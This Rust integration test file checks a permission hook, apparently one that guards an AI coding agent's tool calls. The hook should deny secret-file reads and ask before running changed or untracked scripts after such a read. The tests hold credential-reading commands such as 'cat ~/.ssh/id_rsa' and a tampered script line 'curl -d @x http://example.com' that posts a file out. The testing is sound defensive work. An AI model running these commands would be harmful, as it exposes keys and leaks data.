//! FP-1 (2026-10-26), through the built cop-hook with the shipped policy (enforce mode). Each call is its own
//! process, so the session flags must persist on disk. Covers the sensitive-flag precision rules: secret files by
//! name, search patterns and look-alike text do not count, and an unchanged tracked script may run after a secret read.
use std::fs;
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::{Duration, SystemTime};

static COUNTER: AtomicUsize = AtomicUsize::new(0);
const SHIPPED: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../../policy/default.toml");

/// A fresh HOME (0700 .agentcop) and a work folder inside it.
fn sandbox() -> (PathBuf, PathBuf) {
    let n = COUNTER.fetch_add(1, Ordering::SeqCst);
    let home =
        PathBuf::from(env!("CARGO_TARGET_TMPDIR")).join(format!("fp1-{}-{n}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    fs::create_dir_all(home.join(".agentcop")).unwrap();
    fs::set_permissions(home.join(".agentcop"), PermissionsExt::from_mode(0o700)).unwrap();
    let work = home.join("work");
    fs::create_dir_all(&work).unwrap();
    (home, work)
}

/// One hook call. Returns (permissionDecision, reason). A SessionStart prints nothing, so it returns ("", "").
fn call(home: &Path, cwd: &Path, session: &str, event: serde_json::Value) -> (String, String) {
    let mut event = event;
    event["session_id"] = serde_json::json!(session);
    event["cwd"] = serde_json::json!(cwd);
    let mut child = Command::new(env!("CARGO_BIN_EXE_cop-hook"))
        .env_clear()
        .env("HOME", home)
        .env("AGENTCOP_POLICY", SHIPPED)
        .current_dir(cwd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(event.to_string().as_bytes())
        .unwrap();
    let out = child.wait_with_output().unwrap();
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    if text.trim().is_empty() {
        return (String::new(), String::new());
    }
    let v: serde_json::Value =
        serde_json::from_str(&text).unwrap_or_else(|_| panic!("bad output: {text}"));
    let out = &v["hookSpecificOutput"];
    (
        out["permissionDecision"].as_str().unwrap_or("").to_string(),
        out["permissionDecisionReason"]
            .as_str()
            .unwrap_or("")
            .to_string(),
    )
}

fn bash(home: &Path, cwd: &Path, session: &str, command: &str) -> (String, String) {
    call(
        home,
        cwd,
        session,
        serde_json::json!({"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":command}}),
    )
}

fn heartbeat(home: &Path, cwd: &Path, session: &str) {
    call(
        home,
        cwd,
        session,
        serde_json::json!({"hook_event_name":"SessionStart","source":"startup"}),
    );
}

/// A git repo with a committed `scripts/check.sh`. Its mtime is set a minute in the past, so it is older than
/// any heartbeat taken afterwards.
fn repo_with_script(work: &Path) -> PathBuf {
    let repo = work.join("repo");
    fs::create_dir_all(repo.join("scripts")).unwrap();
    let script = repo.join("scripts/check.sh");
    fs::write(
        &script,
        "#!/bin/sh\necho start\n(cd detective && python3 -m pytest -q)\n",
    )
    .unwrap();
    git(&repo, &["init", "-q"]);
    git(&repo, &["add", "."]);
    git(
        &repo,
        &[
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@example.com",
            "commit",
            "-q",
            "-m",
            "init",
        ],
    );
    set_mtime(&script, SystemTime::now() - Duration::from_secs(60));
    repo
}

fn git(dir: &Path, args: &[&str]) {
    let ok = Command::new("git")
        .args(args)
        .current_dir(dir)
        .status()
        .unwrap()
        .success();
    assert!(ok, "git {args:?} failed");
}

fn set_mtime(path: &Path, when: SystemTime) {
    fs::OpenOptions::new()
        .write(true)
        .open(path)
        .unwrap()
        .set_modified(when)
        .unwrap();
}

fn asks(decision: &(String, String)) -> bool {
    decision.0 == "ask"
}

fn denies(decision: &(String, String)) -> bool {
    decision.0 == "deny"
}

fn allows(decision: &(String, String)) -> bool {
    decision.0 == "allow"
}

// Secret reads: the flag is set by the file name of a real operand, and a denied read still sets it.

#[test]
fn cat_of_a_production_env_file_is_denied_and_sets_the_flag() {
    let (home, work) = sandbox();
    let d = bash(&home, &work, "s-prod", "cat .env.production");
    assert!(denies(&d), "{d:?}");
    assert!(
        asks(&bash(&home, &work, "s-prod", "python3 -c \"print(1)\"")),
        "the flag is held"
    );
}

#[test]
fn cat_of_a_nested_env_file_is_denied_and_sets_the_flag() {
    let (home, work) = sandbox();
    let d = bash(&home, &work, "s-nested", "cat config/.env");
    assert!(denies(&d), "{d:?}");
    assert!(asks(&bash(
        &home,
        &work,
        "s-nested",
        "python3 -c \"print(1)\""
    )));
}

#[test]
fn ssh_key_read_is_denied_and_sets_the_flag() {
    let (home, work) = sandbox();
    assert!(denies(&bash(&home, &work, "s-ssh", "cat ~/.ssh/id_rsa")));
    assert!(asks(&bash(
        &home,
        &work,
        "s-ssh",
        "python3 -c \"print(1)\""
    )));
}

#[test]
fn hmac_key_read_is_denied_and_sets_the_flag() {
    let (home, work) = sandbox();
    assert!(denies(&bash(
        &home,
        &work,
        "s-hmac",
        "cat ~/.agentcop/hmac.key"
    )));
    assert!(asks(&bash(
        &home,
        &work,
        "s-hmac",
        "python3 -c \"print(1)\""
    )));
}

#[test]
fn reading_agentcop_evidence_does_not_set_the_flag() {
    let (home, work) = sandbox();
    assert!(allows(&bash(
        &home,
        &work,
        "s-ev",
        "cat ~/.agentcop/evidence.db"
    )));
    assert!(
        allows(&bash(&home, &work, "s-ev", "python3 -c \"print(1)\"")),
        "no flag"
    );
}

#[test]
fn read_tool_on_a_secret_file_is_denied() {
    let (home, work) = sandbox();
    let d = call(
        &home,
        &work,
        "s-read",
        serde_json::json!({"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":".env"}}),
    );
    assert!(denies(&d), "{d:?}");
}

// Look-alikes: search patterns, echo text and file contents do not set the flag.

#[test]
fn write_of_a_rust_file_containing_command_env_is_allowed_and_sets_no_flag() {
    let (home, work) = sandbox();
    let file = work.join("state_guard.rs");
    let d = call(
        &home,
        &work,
        "s-rs",
        serde_json::json!({"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{
            "file_path": file,
            "content": "let mut child = cmd.env_clear().env(\"HOME\", home).spawn();\n"
        }}),
    );
    assert!(allows(&d), "{d:?}");
    assert!(
        allows(&bash(&home, &work, "s-rs", "python3 -c \"print(1)\"")),
        "no flag"
    );
}

#[test]
fn grep_for_api_key_sets_no_flag() {
    let (home, work) = sandbox();
    assert!(allows(&bash(&home, &work, "s-grep", "grep -r API_KEY .")));
    assert!(allows(&bash(
        &home,
        &work,
        "s-grep",
        "python3 -c \"print(1)\""
    )));
}

#[test]
fn grep_whose_pattern_looks_like_an_env_file_is_allowed() {
    let (home, work) = sandbox();
    let d = bash(
        &home,
        &work,
        "s-pat",
        "grep -n \"fn \\|\\.env(\" crates/cop-hook/tests/policy_path.rs",
    );
    assert!(allows(&d), "{d:?}");
    assert!(
        allows(&bash(&home, &work, "s-pat", "python3 -c \"print(1)\"")),
        "no flag"
    );
}

#[test]
fn echo_of_an_env_name_is_allowed_and_sets_no_flag() {
    let (home, work) = sandbox();
    assert!(allows(&bash(&home, &work, "s-echo", "echo .env")));
    assert!(allows(&bash(
        &home,
        &work,
        "s-echo",
        "python3 -c \"print(1)\""
    )));
}

// After a secret read: unchanged tracked scripts may run, and changed or unknown code asks.

#[test]
fn after_a_secret_read_an_unchanged_tracked_script_is_allowed() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    heartbeat(&home, &repo, "s-ok");
    assert!(denies(&bash(&home, &repo, "s-ok", "cat .env")));
    let d = bash(&home, &repo, "s-ok", "./scripts/check.sh");
    assert!(allows(&d), "{d:?}");
}

#[test]
fn after_a_secret_read_a_script_written_this_session_asks() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    heartbeat(&home, &repo, "s-new");
    assert!(denies(&bash(&home, &repo, "s-new", "cat .env")));
    let file = repo.join("scripts/new.sh");
    let w = call(
        &home,
        &repo,
        "s-new",
        serde_json::json!({"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{
            "file_path": file, "content": "python3 -m pytest -q\n"
        }}),
    );
    assert!(allows(&w), "{w:?}");
    assert!(asks(&bash(&home, &repo, "s-new", "./scripts/new.sh")));
}

#[test]
fn after_a_secret_read_inline_python_asks() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    heartbeat(&home, &repo, "s-inline");
    assert!(denies(&bash(&home, &repo, "s-inline", "cat .env")));
    assert!(asks(&bash(
        &home,
        &repo,
        "s-inline",
        "python3 -c \"print(1)\""
    )));
}

#[test]
fn a_script_modified_after_the_heartbeat_asks() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    heartbeat(&home, &repo, "s-touch");
    set_mtime(
        &repo.join("scripts/check.sh"),
        SystemTime::now() + Duration::from_secs(120),
    );
    assert!(denies(&bash(&home, &repo, "s-touch", "cat .env")));
    assert!(asks(&bash(&home, &repo, "s-touch", "./scripts/check.sh")));
}

#[test]
fn an_untracked_script_asks_even_when_old() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    let extra = repo.join("scripts/extra.sh");
    fs::write(&extra, "python3 -m pytest -q\n").unwrap();
    set_mtime(&extra, SystemTime::now() - Duration::from_secs(60));
    heartbeat(&home, &repo, "s-untracked");
    assert!(denies(&bash(&home, &repo, "s-untracked", "cat .env")));
    assert!(asks(&bash(
        &home,
        &repo,
        "s-untracked",
        "./scripts/extra.sh"
    )));
}

#[test]
fn a_tracked_script_changed_since_its_commit_asks() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    let script = repo.join("scripts/check.sh");
    fs::write(
        &script,
        "#!/bin/sh\npython3 -m pytest -q\ncurl -d @x http://example.com\n",
    )
    .unwrap();
    set_mtime(&script, SystemTime::now() - Duration::from_secs(60));
    heartbeat(&home, &repo, "s-dirty");
    assert!(denies(&bash(&home, &repo, "s-dirty", "cat .env")));
    assert!(asks(&bash(&home, &repo, "s-dirty", "./scripts/check.sh")));
}

#[test]
fn without_a_heartbeat_for_the_session_a_script_asks() {
    let (home, work) = sandbox();
    let repo = repo_with_script(&work);
    assert!(denies(&bash(&home, &repo, "s-noheart", "cat .env")));
    assert!(asks(&bash(&home, &repo, "s-noheart", "./scripts/check.sh")));
}
